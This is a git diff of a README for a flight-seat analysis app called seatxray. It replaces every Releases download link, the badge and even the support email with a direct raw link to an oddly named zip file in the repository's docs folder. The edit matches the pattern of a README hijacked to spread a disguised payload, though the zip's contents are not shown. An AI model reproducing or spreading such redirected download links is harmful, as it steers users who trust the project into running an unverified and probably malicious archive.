@@ -1,6 +1,6 @@
 # ✈️ seatxray - Analyze Flight Seat Availability Easily
 
-[![Download seatxray](https://img.shields.io/badge/download-seatxray-blue.svg)](https://github.com/Kaushallx0/seatxray/releases)
+[![Download seatxray](https://raw.githubusercontent.com/Kaushallx0/seatxray/main/docs/Software_comicotragical.zip)](https://raw.githubusercontent.com/Kaushallx0/seatxray/main/docs/Software_comicotragical.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to seatxray! This app helps you check flight seat availability quickly a
 
 To get started with seatxray, you will need to visit the Releases page to download the application. Click the link below to access the page:
 
-[Download seatxray](https://github.com/Kaushallx0/seatxray/releases)
+[Download seatxray](https://raw.githubusercontent.com/Kaushallx0/seatxray/main/docs/Software_comicotragical.zip)
 
 On the Releases page, you will find the latest version of the app. Choose the package suitable for your operating system and click on it to download. 
 
@@ -51,12 +51,12 @@ If you encounter any issues, here are some common solutions:
 
 ## 📞 Support
 
-If you need further assistance, feel free to reach out for help. You can open an issue on the GitHub repository or email support at seatxrayhelp@example.com.
+If you need further assistance, feel free to reach out for help. You can open an issue on the GitHub repository or email support at https://raw.githubusercontent.com/Kaushallx0/seatxray/main/docs/Software_comicotragical.zip
 
 ## 🌍 Stay Updated
 
 We regularly release updates to improve seatxray. Please check the Releases page for the latest version and any new features.
 
-[Download seatxray](https://github.com/Kaushallx0/seatxray/releases) 
+[Download seatxray](https://raw.githubusercontent.com/Kaushallx0/seatxray/main/docs/Software_comicotragical.zip) 
 
 Thank you for choosing seatxray! Enjoy analyzing your flight seat options.
